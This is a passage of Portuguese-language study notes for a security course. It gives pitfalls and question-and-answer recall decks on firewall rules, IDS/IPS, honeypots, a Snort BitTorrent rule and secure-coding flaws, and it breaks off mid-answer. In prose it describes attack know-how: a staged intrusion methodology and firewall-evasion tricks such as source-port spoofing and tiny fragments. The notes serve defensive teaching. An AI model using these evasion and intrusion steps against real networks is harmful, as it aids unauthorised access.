| Heartbleed                                 | OpenSSL, 2014, leitura excessiva de buffer                        |
| Fuzzing                                    | Barton Miller, 1989                                               |
| Compilador malicioso                       | Ken Thompson, 1984                                                |
| Morris Worm                                | comando DEBUG do sendmail                                         |
| Exemplo de canonicalização                 | "/" é 2F; falha do IIS nos anos 1990                              |
| Áreas críticas de interação                | 4: entrada, algoritmo, outros componentes, saída                  |
| Norma citada                               | ISO 12207 ciclo de vida de software                               |

### Armadilhas

1. **Um filtro positivo termina com deny, um filtro negativo termina com allow.** Não o contrário.
2. **O firewall com estado ainda lê os mesmos cabeçalhos que o filtro de pacotes.** Ele
   acrescenta o estado da conexão, não substitui as regras.
3. **O proxy de circuito não examina a carga útil.** Só o proxy de aplicação examina.
4. **SOCKS não é um gateway de camada de rede.** É uma camada intermediária entre aplicação
   e transporte, e não encaminha ICMP.
5. **A regra 4 refinada precisa tanto da porta de origem 25 quanto do flag ACK.** A porta de
   origem sozinha é derrotada por um atacante que roda um serviço na porta 25.
6. **O ataque de fragmento minúsculo não é sobre limites de tamanho.** Ele separa o cabeçalho
   TCP do primeiro fragmento, pelo qual o filtro decide.
7. **IPsec atrás do firewall cega o firewall.** IPsec no roteador de borda é menos seguro. A
   resposta é IPsec no firewall.
8. **O firewall interno protege nos dois sentidos.** A DMZ também é protegida da rede interna.
9. **Um IDS detecta e alerta; um IPS bloqueia.** O IPS precisa de um sensor em linha.
10. **A detecção por assinatura não vê ataques de dia zero.** A detecção de anomalia pode, ao
    preço de mais falsos alarmes.
11. **Internos são o caso mais difícil (Anderson).** A busca de anomalias sozinha é
    insuficiente para eles.
12. **A falácia da taxa-base:** intrusões são raras, então mesmo um bom IDS produz muitos
    falsos alarmes. Alta detecção e poucos falsos alarmes são extremamente difíceis juntos.
13. **O NIDS perde em tráfego cifrado.** É parte da solução, não a solução.
14. **Rastros de chamadas de sistema são a fonte preferida do HIDS em Unix, e problemáticos
    no Windows** por causa das DLLs.
15. **Antivírus é HIDS por assinatura.** É muito eficiente em malware conhecido e inútil em
    dia zero.
16. **Um honeypot que inicia tráfego de saída foi comprometido.** Qualquer tráfego de entrada
    para ele é suspeito.
17. **Baixa interação emula; alta interação é um sistema real** e o maior risco jurídico.
18. **A regra do Snort é detecção por assinatura**, sem linha de base e sem treinamento.
19. **Heartbleed é uma leitura excessiva de buffer, não um estouro.** O código leu mais do
    que recebeu.
20. **"stack smashing detected" é a proteção do GCC, não o ataque.** O ataque precisa de
    `-fno-stack-protector` para reproduzir.
21. **XSS mira o próximo usuário, não o servidor.** É uma falha de tratamento de entrada e de saída.
22. **Lista branca, não lista negra.** Listas negras falham a cada nova evasão.
23. **Canonicalizar antes de validar.** Senão uma codificação alternativa de "/" passa pelo filtro.
24. **Conversões de sem sinal para com sinal invertem verificações de tamanho.** Um valor
    enorme vira negativo e passa.
25. **Variáveis de ambiente são entrada.** PATH e LD_LIBRARY_PATH atacam scripts privilegiados.

---

## 7. Baralhos de recordação

Perguntas primeiro, respostas abaixo. Cada baralho indica a Parte de origem.

### 7.1 Baralho F: firewalls

#### Perguntas

**F1.** Enuncie o dilema do firewall e os seis estágios da evolução dos sistemas. Por que a
segurança por host não basta?

**F2.** Defina o perímetro, o ponto de gargalo e a defesa em profundidade. Enuncie os três
objetivos de projeto de [BELL94] e como cada um é alcançado.

**F3.** O que é a política de acesso, de onde ela vem, e por quais quatro características
ela pode filtrar (NIST SP 800-41)?

**F4.** Quatro capacidades e quatro limitações de um firewall.

**F5.** Filtro positivo versus negativo, e descarte padrão versus encaminhamento padrão:
lemas, segurança, usuários, quem usa cada um.

**F6.** Cinco campos que um filtro de pacotes usa. Três vantagens e cinco fraquezas.

**F7.** Tabela 9.1: as cinco regras SMTP, a falha na regra 4, a exploração, os dois
refinamentos, e por que o flag ACK funciona.

**F8.** Falsificação de IP e fragmento minúsculo: mecanismo e contramedida de cada um.

**F9.** O problema da falta de contexto: portas, números, e a solução com estado com sua tabela.

**F10.** Escreva o filtro positivo e o filtro negativo para o servidor web da lista 8.
Nomeie as regras implícitas.

**F11.** Proxy de aplicação: mecanismo, quatro propriedades, o exemplo de GET e POST.

**F12.** Proxy de circuito: mecanismo, diferença principal, o uso híbrido. SOCKS: versão,
RFC, porta, posição, componentes, os cinco passos TCP, tratamento de UDP.

**F13.** Host bastião: definição e nove características, com os números de linhas.

**F14.** Firewalls de host, de dispositivo de rede, virtuais e pessoais: o que é cada um e
suas vantagens. Implementações de firewall pessoal, política padrão, regra do FTP, quatro
recursos avançados.

**F15.** DMZ: o que fica onde, o que vive nela, os três propósitos do firewall interno.

**F16.** VPN: problema, solução, protocolo, e as três posições do IPsec com seus problemas.

**F17.** Firewalls distribuídos: componentes, característica principal, vantagens.

**F18.** DROP versus REJECT: o que é enviado de volta, o flag TCP, por que DROP é furtivo.

#### Respostas

Fonte: Parte 1 e seção 4.

**F1.** Proteger os ativos internos e ainda permitir acesso a WANs e à Internet.
Estágios: mainframe com terminais; LANs; rede de instalações com várias LANs; rede
corporativa sobre uma WAN privada; conectividade com a Internet; nuvem corporativa com
servidores virtualizados. Segurança por host: milhares de sistemas com vários SOs precisam
cada um de correção quando uma falha aparece; exige gerência de configuração escalável e
aplicação agressiva de correções; difícil e às vezes não compensa o custo. O firewall é a
alternativa ou o complemento aceito.

**F2.** Perímetro: a muralha entre a rede das instalações e a Internet. Ponto de gargalo: um
ponto onde segurança e auditoria são impostas; um sistema ou vários cooperando. Defesa em
profundidade: o firewall é uma camada extra que isola os sistemas internos, doutrina militar
clássica. Objetivos: todo o tráfego passa pelo firewall, bloqueando fisicamente todo outro
caminho; só passa o tráfego autorizado pela política; o firewall é imune a penetração, por um
sistema reforçado com SO seguro.

**F3.** A lista dos tipos de tráfego autorizados a passar, por faixas de endereços,
protocolos, aplicações, tipos de conteúdo. Desenvolvida a partir da avaliação de risco e da
política de segurança da informação: especificação ampla, refinada em elementos de filtro,
implementada na topologia. Características: endereço IP e protocolo (filtros de pacotes, com
estado); protocolo de aplicação (proxy: spam SMTP, sites HTTP); identidade do usuário
(usuários internos, exige IPsec); atividade de rede (hora do dia, taxa de requisições contra
varredura, padrões).

**F4.** Capacidades: ponto de gargalo único (mantém usuários não autorizados fora, bloqueia
serviços vulneráveis, protege contra falsificação e ataques de roteamento, simplifica a
gerência); local de monitoramento (auditorias, alarmes); plataforma para NAT e logs de
gerência de rede; plataforma para VPNs IPsec em modo túnel. Limitações: ataques que o
contornam (enlace próprio a provedor, enlaces a parceiros); ameaças internas (funcionário
descontente, vítima de phishing); LANs sem fio inseguras; dispositivos portáteis infectados (BYOD).

**F5.** O filtro positivo passa só pacotes correspondentes, deny no final. O filtro negativo
rejeita pacotes correspondentes, allow no final. Descarte padrão: "não expressamente
permitido é proibido", mais seguro, tudo bloqueado e depois adicionado caso a caso, visível
aos usuários como obstáculo, empresas e governo. Encaminhamento padrão: "não expressamente
proibido é permitido", mais fácil para os usuários, segurança reduzida, o administrador reage
a cada nova ameaça, organizações abertas como universidades.

**F6.** IP de origem, IP de destino, porta de origem e de destino, campo de protocolo IP
(TCP, UDP, ICMP), interface. Vantagens: simplicidade, transparência, velocidade (sem carga
útil). Fraquezas: sem dados das camadas superiores (não bloqueia comandos de aplicação);
registro limitado; sem autenticação avançada de usuário; vulnerável a ataques na pilha TCP/IP
como falsificação; sujeito a erro de configuração por causa das poucas variáveis.

**F7.** Regra 1 entrada, externo para interno, TCP, destino 25, permit. Regra 2 saída,
destino > 1023, permit. Regra 3 saída, destino 25, permit. Regra 4 entrada, destino > 1023,
permit. Regra 5 ambos, qualquer, deny. Falha: a regra 4 deixa tráfego externo alcançar
qualquer porta acima de 1023. Exploração: porta 5150 do atacante para o proxy interno na
porta 8080. Refinamento 1: porta de origem 25 nas regras 2 e 4, porta de origem > 1023 nas
regras 1 e 3. Buraco restante: um atacante roda um serviço na porta 25 e envia da porta de
origem 25. Refinamento 2: a regra 4 exige o flag ACK, porque um pacote de uma conexão
estabelecida sempre tem ACK, e um pacote que inicia uma conexão tem SYN sem ACK.

**F8.** Falsificação: pacotes de fora carregam um endereço de origem interno confiável para
passar pela segurança baseada em endereço; contramedida: descartar pacotes que chegam na
interface externa com endereço de origem interno. Fragmento minúsculo: a fragmentação IP
empurra o cabeçalho TCP com as portas para um fragmento posterior, o filtro decide pelo
primeiro fragmento e deixa o resto passar; contramedida: exigir uma quantidade mínima do
cabeçalho de transporte no primeiro fragmento, e se ele é rejeitado lembrar o ID do pacote e
descartar os fragmentos seguintes.

**F9.** O filtro sem estado decide pacote a pacote sem conhecimento das conexões. Servidor:
porta bem conhecida fixa abaixo de 1024 (SMTP 25). Cliente: porta temporária acima de 1024
(49152). Para deixar as respostas entrarem, toda porta alta precisa estar aberta na entrada.
Com estado: uma tabela de estado das conexões TCP de saída ativas (endereço e porta de
origem, endereço e porta de destino, estado, por exemplo 192.168.1.100:1030 para
210.9.88.29:80 estabelecida); tráfego de entrada para uma porta alta é aceito só se
corresponde a uma entrada. Também rastreia números de sequência TCP contra sequestro de
sessão e faz DPI limitado para FTP, IM, SIPS.

**F10.** Positivo: any:>1023 para 172.16.20.5:80 permit; any:>1023 para 172.16.20.5:443
permit; 10.0.0.100:>1023 para 172.16.20.5:22 permit; deny all implícito. Negativo: 10.0.0.100 para :22
permit (exceção primeiro); any para :22 deny; any para :21 deny; any para :1-79, :81-442,
:444-65535 deny; allow all implícito. O filtro negativo precisa de faixas para expressar
"outros: não".

**F11.** Um retransmissor no nível de aplicação: o usuário contata o gateway, dá o host
remoto e as credenciais, o gateway abre sua própria conexão com o servidor e retransmite
segmentos; duas conexões emendadas, sem fim a fim. Controle granular: sem código de proxy,
sem serviço; permitir HTTP GET, negar POST. Mais seguro: umas poucas aplicações em vez de
incontáveis combinações de IP, porta, flag. Registro e auditoria fáceis no nível de
aplicação. Desvantagem: sobrecarga de processamento nas duas conexões.

**F12.** Duas conexões TCP, host interno ao gateway e gateway ao host externo; uma vez
estabelecidas ele retransmite segmentos sem examinar a carga útil; a segurança é só quais
conexões são permitidas. Híbrido: usuários internos confiáveis, proxy de aplicação na
entrada (caro, seguro), proxy de circuito na saída (barato). SOCKS v5, RFC 1928, servidor na
porta TCP 1080; uma camada intermediária entre aplicação e transporte, não um gateway de
rede, sem ICMP. Componentes: servidor SOCKS no firewall, biblioteca cliente nos hosts
internos, clientes SOCKS-ificados religados. TCP: conectar à 1080, negociar autenticação,
autenticar, enviar uma requisição de retransmissão (IP e porta), o servidor avalia e conecta.
UDP: uma conexão TCP de controle à 1080 só para autenticar, depois os segmentos UDP são
retransmitidos enquanto ela fica aberta.

**F13.** Um sistema identificado pelo administrador como ponto forte crítico; a plataforma
para proxies de aplicação e de circuito e serviços como IPsec; um sistema reforçado com SO
seguro. Características: só serviços essenciais (proxies para DNS, FTP, HTTP, SMTP);
autenticação extra antes dos proxies e por proxy; cada proxy suporta um subconjunto de
comandos; cada proxy permite só hosts internos específicos; logs de auditoria detalhados por
proxy; software muito pequeno (aplicação de correio 20.000+ linhas, proxy menos de 1.000),
mais fácil de auditar; proxies independentes, um pode ser removido, novos serviços
adicionados; sem acesso a disco além da configuração inicial, então sistemas de arquivos
executáveis podem ser somente leitura contra cavalos de Troia e sniffers; cada proxy roda
como usuário sem privilégios em um diretório privado.

**F14.** De host: um módulo de software que protege um host, muitas vezes um servidor; regras
ajustadas, proteção independente da topologia, camada extra para que novos servidores não
exijam mudança no firewall de rede. De dispositivo de rede: filtragem de pacotes e inspeção
com estado em roteadores e switches, camadas extras. Virtual: um host bastião virtualizado
como VM, ou funções de firewall no hipervisor. Pessoal: entre um PC e a rede, em casa ou em
intranets, como software no PC ou no roteador doméstico; mais simples; nega acesso remoto não
autorizado e monitora atividade de saída contra worms; netfilter, pf, Windows Firewall; CLI
ou GUI. Padrão: entrada negada exceto o que o usuário permite, saída permitida. FTP: portas
20 e 21 abertas, e depois de uma conexão a partir de 20 ou 21, portas 1024 a 65535 abertas
para dados. Avançados: modo furtivo (descarta pacotes não solicitados), bloqueio de UDP,
registro, filtro de aplicação (só aplicações selecionadas ou assinadas por CA).

**F15.** Firewall externo na borda depois do roteador de borda; firewall(s) interno(s)
protegendo a rede corporativa; a DMZ entre eles com o site web, o servidor SMTP e o servidor
DNS. Firewall externo: proteção moderada para a DMZ, básica para o resto. Firewall interno:
filtragem mais estrita; proteção nos dois sentidos, a rede interna de um servidor da DMZ
comprometido (malware, rootkits, bots) e a DMZ da rede interna; segmentação interna com
vários firewalls (servidores versus estações de trabalho).

**F16.** Problema: LANs dispersas precisam interconectar-se; a Internet é mais barata e mais
fácil que linhas privadas mas expõe o tráfego a escuta e acesso não autorizado. Solução: uma
VPN, computadores interconectados por uma rede insegura com criptografia e autenticação nas
camadas inferiores, mesmo sistema nos dois extremos. Protocolo: IPsec; o dispositivo IPsec
cifra e comprime todo o tráfego para a WAN e reverte na entrada, de forma transparente; a
estação de um usuário remoto pode rodar IPsec mas vira um alvo atraente. Posições: atrás do
firewall, o firewall não consegue filtrar, varrer, registrar ou controlar tráfego cifrado; no
roteador de borda, menos seguro que o firewall; no próprio firewall, a escolha funcional.

**F17.** Firewalls de rede autônomos mais firewalls de host em servidores e estações de
trabalho, sob controle administrativo central; ferramentas deixam o administrador definir
políticas e monitorar centenas de firewalls de host e pessoais, locais e remotos. Vantagens:
proteção contra ataques internos, proteção ajustada a máquinas e aplicações.

**F18.** DROP descarta em silêncio, nada volta; REJECT descarta e envia um erro, um erro ICMP
ou um reset TCP (além dos slides). O flag é RST. Furtivo: com REJECT o atacante recebe um
"fechada, host vivo" imediato por sondagem; com DROP cada sondagem espera um timeout e
retransmite, a porta aparece como "filtrada", e o host parece ausente, que é o modo furtivo
do slide 500.

### 7.2 Baralho D: IDS/IPS, honeypots e Snort

#### Perguntas

**D1.** Externos versus internos, e as quatro classes de intruso com motivação e exemplos.

**D2.** Onde IDS/IPS funcionam bem e onde falham? Por quê?

**D3.** A metodologia comum de ataque e seus seis passos, com um exemplo cada.

**D4.** Defina intrusão de segurança, detecção de intrusão, e os três componentes lógicos de
um IDS. Classifique pela fonte de dados.

**D5.** Três motivações para um IDS. A suposição fundamental e sua consequência.

**D6.** O compromisso frouxo versus estrito. A visão clássica sobre externos e internos.
A falácia da taxa-base.

**D7.** Os nove requisitos de um IDS.

**D8.** Detecção de anomalia: as duas fases e as três categorias, com vantagens e
desvantagens de cada uma. Seis abordagens de aprendizado de máquina.

**D9.** Detecção por assinatura versus heurística: como, onde usada, vantagens,
desvantagens, a fonte das regras, o sistema de exemplo.

**D10.** Assinatura versus anomalia em dia zero, falsos positivos, custo, adaptabilidade.

**D11.** HIDS: definição, propósitos, quatro fontes de dados com vantagem e desvantagem.

**D12.** HIDS de anomalia em Linux: por que chamadas de sistema, STIDE, os quatro motores de
ML. HIDS por assinatura: do que é a base, duas técnicas, limite.

**D13.** NIDS: definição, camadas, contraste com HIDS, arquitetura, a limitação da criptografia.

**D14.** Sensor em linha versus passivo. A configuração passiva com a derivação e duas NICs.
Sensores sem fio e WIDS.

**D15.** Honeypots: definição, três objetivos, a lógica, a regra do valor, baixa versus alta
interação com compromissos, honeynet.

**D16.** As três posições do honeypot com vantagens e desvantagens. Honeyfiles.

**D17.** Escreva o cabeçalho da regra do Snort e explique cada parte. Explique msg, flow,
content, depth, threshold, reference, classtype, sid, rev.

**D18.** O pipeline do Snort do pacote ao alerta. Qual abordagem é a regra do BitTorrent?

**D19.** IDS versus IPS em termos de ação. Por que um filtro de pacotes é insuficiente para
detecção?

**D20.** HIDS ou NIDS para: chamadas de sistema anômalas, varredura de portas, exploit em
servidor web, acesso a arquivos sensíveis. Onde combiná-los ajuda mais?

#### Respostas

Fonte: Parte 2 e seção 5.

**D1.** A maioria das violações por externos, algumas por internos, internos podem ser muito
mais perigosos; ataques direcionados contornam as defesas de perímetro, daí defesa em
profundidade. Criminosos cibernéticos: recompensa financeira, roubo de identidade e
credenciais, espionagem, roubo ou resgate de dados, fóruns clandestinos (DarkMarket).
Ativistas: causas sociais ou políticas, muitas vezes baixa habilidade, pichação, DoS,
vazamentos; Anonymous, LulzSec, Manning, Snowden. APTs: espionagem ou sabotagem patrocinada
por estados, sigilosos e persistentes; China, Rússia, EUA, Reino Unido. Outros: hackers
clássicos por desafio e reputação (descobriram o estouro de buffer), hackers amadores com
kits, recrutáveis.

**D2.** Razoavelmente eficazes contra ataques conhecidos, menos sofisticados: grupos
ativistas, golpes de e-mail em larga escala. Menos eficazes contra ataques direcionados
sofisticados de criminosos cibernéticos e APTs, porque usam exploits de dia zero e escondem
sua atividade. Daí parte da defesa em profundidade com criptografia, trilhas de auditoria,
autenticação forte, gerência ativa.

**D3.** Phishing, instalação de malware, roubo de credenciais, comprometimento. Aquisição do
alvo e coleta de informação: OSINT, DNS e WHOIS, NMAP, e-mail de sondagem, CMS vulnerável.
Acesso inicial: força bruta na senha do CMS, exploit de plugin, spear-phishing com exploit de
navegador. Escalação de privilégio: exploits locais até root, sniffers para senhas de admin.
Coleta de informação ou exploração: varrer arquivos por dados financeiros e PII, exfiltrar
documentos, movimentação lateral com senhas capturadas. Manutenção do acesso: backdoor de
RAT ou rootkit, guardar a senha de admin, desabilitar antivírus ou IDS. Apagar rastros: o
rootkit esconde arquivos, editar logs.

**D4.** Intrusão: um ato não autorizado de contornar os mecanismos de segurança de um
sistema. Detecção de intrusão: uma função de hardware ou software que coleta e analisa
informação de várias áreas de um computador ou rede para identificar possíveis intrusões.
Componentes: sensores (coletam pacotes, logs, chamadas de sistema e encaminham),
analisadores (decidem, com evidências e orientação; dados podem ser armazenados), interface
de usuário (ver e controlar). Arquitetura: simples (um sensor, um analisador) ou distribuída
(muitos sensores, analisador central). Classes: HIDS (um host: PIDs, chamadas de sistema),
NIDS (tráfego de segmentos), distribuído ou híbrido (combina os dois, melhor identificação e resposta).

**D5.** Detecção rápida (expulsar o intruso antes do dano; mais cedo significa menos dano,
recuperação mais rápida), efeito dissuasório, coleta de informação para fortalecer a
prevenção (regras de firewall, correções). Suposição: o comportamento do intruso difere do
comportamento legítimo de formas quantificáveis. Não existe distinção nítida, então há
sobreposição e portanto falsos positivos e negativos; o analisador minimiza a sobreposição.

**D6.** A interpretação frouxa pega mais intrusos e produz muitos falsos positivos (usuários
autorizados marcados). A estrita limita os falsos positivos e aumenta os falsos negativos
(intrusos perdidos). Objetivo: maximizar a taxa de detecção, minimizar a taxa de falsos
alarmes; um compromisso e uma arte. Visão clássica: externos são distinguíveis com confiança
razoável a partir de padrões históricos e desvios significativos; internos são os mais
difíceis (Anderson), a diferença entre seu comportamento anormal e normal é minúscula,
anomalias sozinhas são insuficientes, então usar regras de uso não autorizado definidas com
inteligência. Falácia da taxa-base: intrusões são muito raras comparadas ao uso legítimo,
então a menos que o IDS seja quase perfeito a taxa de falsos alarmes é alta; falsos alarmes
frequentes são ignorados ou desperdiçam tempo, uma taxa de detecção baixa dá falsa segurança.

**D7.** Rodar continuamente com supervisão mínima; tolerante a falhas, recupera-se de
quedas; resiste a subversão, monitora a si mesmo; sobrecarga mínima; configurável conforme a
política de segurança; adapta-se a mudanças no comportamento do sistema e dos usuários;
escala para muitos hosts; evita parada completa do serviço quando componentes falham;
reconfiguração dinâmica sem reinicialização.

**D8.** A fase de treinamento constrói o modelo de comportamento legítimo a partir dos dados
dos sensores em operação normal (em momentos distintos ou continuamente); a fase de detecção
compara o comportamento observado com o modelo e o classifica. Estatística: univariada
(grosseira), multivariada (correlações), série temporal (ordem e tempo); simples, barata,
sem suposições; difícil escolher métricas, nem todo comportamento se encaixa. Baseada em
conhecimento: regras de sistema especialista, possivelmente manuais, máquinas de estados
finitos e linguagens de descrição; robusta e flexível; regras lentas e difíceis de escrever,
exigem especialistas humanos. Aprendizado de máquina: mineração de dados constrói o modelo a
partir de dados normais de treinamento; flexível, adaptável, captura interdependências
complexas, eficiente depois de treinado; depende de suposições sobre o comportamento aceito,
taxa de falsos alarmes atualmente inaceitável, o treinamento custa muito tempo e recursos.
Abordagens: redes bayesianas, modelos de Markov, redes neurais, lógica fuzzy, algoritmos
genéticos, agrupamento e detecção de outliers.

**D9.** Detecção de mau uso: um conjunto de padrões maliciosos conhecidos ou regras de
ataque; uma correspondência significa um intruso. Assinaturas comparam dados com padrões
maliciosos conhecidos, detalhadas o bastante para limitar falsos alarmes e ainda pegar o
suficiente; usadas em antivírus, proxies de varredura de tráfego, NIDS; baixo custo, ampla
aceitação; esforço significativo para construir assinaturas, sem dia zero. Heurísticas usam
regras para ataques conhecidos ou fraquezas conhecidas e comportamento suspeito mesmo dentro
de padrões normais; a melhor fonte é analisar ferramentas e scripts de ataque da Internet
mais regras de especialistas; específicas de máquina e SO. O Snort é o NIDS baseado em regras
com uma grande coleção de regras.

**D10.** Dia zero: assinatura não, anomalia possível. Falsos positivos: assinatura baixos,
anomalia mais altos (sobreposição, taxa-base, ML inaceitável hoje). Custo: assinatura baixo
em execução, esforço para escrever e revisar; anomalia depende, estatística barata, baseada
em conhecimento exige especialistas, ML caro para treinar depois eficiente. Adaptabilidade:
assinatura precisa de uma nova assinatura por ataque; anomalia evolui com o comportamento,
ML flexível; requisito 6 de um IDS.

**D11.** Uma camada especializada de software de segurança em sistemas vulneráveis ou
sensíveis (servidores de banco de dados, sistemas administrativos), monitorando a atividade
interna; detectar intrusões, registrar eventos suspeitos, enviar alertas; as duas
abordagens. Rastros de chamadas de sistema: preferidos, funcionam em Unix e Linux,
problemáticos no Windows porque as DLLs obscurecem qual processo chama o quê. Registros de
auditoria: já coletados pelo SO, sem software extra; podem faltar informação ou formato,
intrusos os manipulam. Somas de verificação de integridade de arquivos: hash periódico de
arquivos críticos contra uma linha de base; as somas corretas precisam ser geradas e
protegidas, arquivos que mudam legitimamente são difíceis. Acesso ao Registro: Windows,
muita atividade de programas ali; muito específico, sucesso limitado. Sensor: coletar,
filtrar para um formato padrão, encaminhar.

**D12.** A maior parte do trabalho de HIDS de anomalia foi em UNIX e Linux, coleta de dados
fácil; chamadas de sistema são a forma de os programas alcançarem o kernel e dão atividade
detalhada dos processos. O STIDE compara as sequências de chamadas observadas com as
sequências normais do treinamento para uma razão de discordância. Alternativas: HMM, ANN,
SVM, ELM. Desempenho: taxa de detecção, falsos positivos, velocidade de detecção. O HIDS por
assinatura é a base do antivírus, em PCs, celulares, proxies de e-mail e web, NIDS;
assinaturas (padrões de arquivo de malware conhecido) e heurísticas (regras de comportamento
malicioso conhecido); muito eficiente em malware conhecido, não detecta dia zero; amplamente
usado no Windows.

**D13.** Monitora o tráfego em pontos selecionados, pacote a pacote, em tempo real ou
próximo, em L3, L4 e L7. O NIDS examina o tráfego de pacotes dirigido aos sistemas, o HIDS
examina a atividade de usuários e software dentro de um host. Parte da infraestrutura de
perímetro, no firewall ou ao lado dele, focado em tentativas externas. Sensores, servidores
de gerência, consoles de gerência. Com TLS/SSL o NIDS perdeu acesso a carga útil
significativa (não vê comandos em HTTPS); importante mas só parte da solução.

**D14.** Em linha: no segmento, o tráfego passa por ele, pode ser combinado com um firewall
ou switch, pode bloquear, atua como IDS e IPS. Passivo: o mais comum, monitora uma cópia, o
tráfego real não passa, mais eficiente, sem atraso. Configuração: uma derivação no meio
(fibra) dá uma cópia de todo o tráfego; NIC 1 na derivação, normalmente sem IP, modo
promíscuo; NIC 2 com IP para o servidor de gerência. Sensores sem fio em linha em um AP ou
passivos no ar; só eles veem ataques de protocolo sem fio (DoS sem fio, sequestro de sessão,
AP falso); WIDS é um NIDS só para redes sem fio.

**D15.** Sistemas-isca que atraem atacantes para longe dos sistemas críticos. Desviar,
coletar informação sobre técnicas e ferramentas, ganhar tempo para os administradores
responderem. Preenchido com informação fabricada de aparência valiosa que nenhum usuário
legítimo acessa, então qualquer acesso é suspeito; instrumentado com monitores e
registradores; o ataque parece ter sucesso então o atacante é rastreado sem expor a
produção. Sem valor de produção: entrada é sondagem, varredura ou ataque; saída significa
que foi comprometido. Baixa interação emula serviços, interação inicial realista, sem
serviços completos; suficiente para os estágios iniciais e alertas em um IDS distribuído.
Alta interação é um SO real com serviços reais, instrumentado; mais realista, prende o
atacante por mais tempo; exige muito mais recursos, e se comprometido ataca outros,
problemas jurídicos e de reputação. Honeynet Project: redes inteiras de honeypots emulando
uma empresa com tráfego simulado.

**D16.** Externo, antes do firewall: rastreia varreduras de IPs não usados, sem risco à rede
interna, reduz o ruído no firewall e nos sensores internos; pouca captura de internos. DMZ:
monitora ataques aos serviços públicos; risco de contaminação para os outros sistemas da
DMZ; o firewall externo bloqueia a maior parte do tráfego (só 80 e 443), então ou abri-lo e
aumentar o risco ou limitar o honeypot. Interno: captura ataques internos, o mais importante;
detecta um firewall mal configurado; alto risco, um honeypot comprometido ataca sistemas
internos, o firewall vê o tráfego do atacante como permitido, regras de exceção necessárias.
Honeyfiles: documentos falsos com nomes realistas ("Salarios Diretoria.xlsx") como isca;
qualquer acesso é suspeito.

**D17.** `alert tcp $HOME_NET any -> $EXTERNAL_NET ![7680,1521]`: alert gera um alerta; tcp
só TCP; $HOME_NET any, origem rede interna, qualquer porta; -> sentido; $EXTERNAL_NET
![7680,1521], destino rede externa, exceto as portas 7680 e 1521. msg: a mensagem de log
"ET P2P BitTorrent peer sync". flow:established,to_server: só conexões TCP estabelecidas no
sentido do servidor. content:"|00 00 00 0d 06 00|": busca essa sequência de bytes. depth:6:
só nos primeiros 6 bytes da carga útil. threshold: type limit, track by_dst, seconds 300,
count 1: um alerta por destino a cada 300 s. reference: URL da documentação do protocolo
BitTorrent. classtype:policy-violation: categoria. sid:2000334: ID único. rev:14: revisão 14. metadata: criada em 2010_07_30, confiança Medium, severidade Informational, atualizada
em 2025_06_30.

**D18.** Tráfego de rede, decodificador de pacotes, pré-processador, motor de detecção com as
regras, sistema de registro e alerta, módulos de saída, saída como alerta ou log. A regra é
detecção por assinatura: um padrão fixo de bytes em uma posição fixa em um estado de
protocolo conhecido, sem linha de base, sem treinamento; o Snort é o exemplo de NIDS baseado
em regras.

**D19.** O IDS detecta, registra e alerta, pode usar um sensor passivo em uma cópia do
tráfego. O IPS bloqueia o ataque, precisa de um sensor em linha, arrisca bloquear tráfego
legítimo em um falso positivo e acrescenta atraso. Filtro de pacotes: só cabeçalhos, sem
carga útil, sem ataques de aplicação, log limitado, sem contexto entre pacotes, contornado
por falsificação e fragmentos, nunca vê tráfego que o contorna nem internos; a detecção
precisa de carga útil, sequências de pacotes e dados do host.

**D20.** Chamadas de sistema: HIDS, a fonte preferida, STIDE. Varredura de portas: NIDS, um
padrão pelo segmento. Exploit web: NIDS com assinaturas, mas HIDS no servidor quando HTTPS
cega o NIDS. Arquivos sensíveis: HIDS, somas de verificação, registros de auditoria,
honeyfiles. A combinação (IDS distribuído ou híbrido) ajuda mais no servidor web: o NIDS vê a
requisição, o HIDS vê o efeito e cobre HTTPS; e na exfiltração depois do acesso a arquivos,
visível só na rede.

### 7.3 Baralho V: vulnerabilidades de software

#### Perguntas

**V1.** A raiz do problema. As cinco falhas de código do OWASP Top 10. As três categorias
do CWE/SANS Top 25 com dois exemplos cada.

**V2.** Como a segurança de software difere da qualidade de software? Quem escolhe a
distribuição de probabilidade?

**V3.** Defina programação defensiva e sua regra principal. O que o software faz sob ataque?

**V4.** Por que os programadores não escrevem de forma defensiva? Pressão de negócio,
manutenção, mentalidade, maturidade, normas.

**V5.** As quatro áreas críticas de interação. Defina entrada e suas fontes. Duas preocupações.

**V6.** Estouro de buffer: a suposição, a consequência, por que os testes o perdem, as correções.

**V7.** O exemplo em C da aula: o que estoura sobre o quê, por quê, o que o GCC imprime, qual
flag reproduz o ataque.

**V8.** Interpretação da entrada: binário versus texto, Heartbleed, conjuntos de caracteres.

**V9.** Ataques de injeção: definição, mecanismo, onde são comuns. Exemplo de injeção de SQL,
entrada e prevenção.

**V10.** Injeção de código em PHP: o cenário do include, o exemplo GET, os dois recursos do
PHP, as defesas. Desserialização insegura.

**V11.** XSS: o exemplo do cookie, ofuscação, prevenção, a natureza da falha, o alvo real.

**V12.** Lista branca versus lista negra. Canonicalização com o exemplo do "/". A
vulnerabilidade de conversão de tipo. Fuzzing.

**V13.** Falhas de algoritmo: quatro exemplos históricos. Riscos e defesas de memória e concorrência.

**V14.** Interação com o SO: variáveis de ambiente e seus ataques, práticas de menor
privilégio, modularização, chroot, apagamento seguro de arquivos.

**V15.** Saída: o problema da origem comum, dois ataques pela saída, três mitigações.

#### Respostas

Fonte: Parte 3.

**V1.** Más práticas de programação causam muitas vulnerabilidades; a consciência é o
primeiro passo. OWASP: entrada não validada, XSS, estouro de buffer, falhas de injeção,
tratamento de erro inadequado. CWE/SANS: interação insegura entre componentes (injeção de
SQL, injeção de comando do SO, XSS, CSRF, upload perigoso, open redirect); gerência arriscada
de recursos (estouro de buffer, path traversal, download sem verificação de integridade,
função perigosa, cálculo errado do tamanho do buffer, string de formato, estouro de
inteiro); defesas porosas (falta de autenticação ou autorização, credenciais fixas no
código, falta de cifragem, entrada não confiável em decisão de segurança, privilégios
desnecessários, criptografia quebrada, tentativas de login ilimitadas, hash sem sal).

**V2.** Qualidade: falhas seguem alguma distribuição de probabilidade; projeto estruturado e
testes sobre entradas prováveis removem a maioria dos bugs; o que importa é com que
frequência os bugs disparam. Segurança: o atacante escolhe a distribuição, mirando bugs
exploráveis disparados por entradas longe do esperado, então testes comuns os perdem. Código
seguro não supõe nada e verifica todo erro.

**V3.** Projetar e implementar software de modo que continue funcionando sob ataque; detecta
condições errôneas causadas por um ataque e continua com segurança ou falha de forma
graciosa. Regra: nunca supor nada, verificar toda suposição, tratar todo estado de erro possível.

**V4.** Programadores focam nos passos para o sucesso e no fluxo normal, não nos pontos de
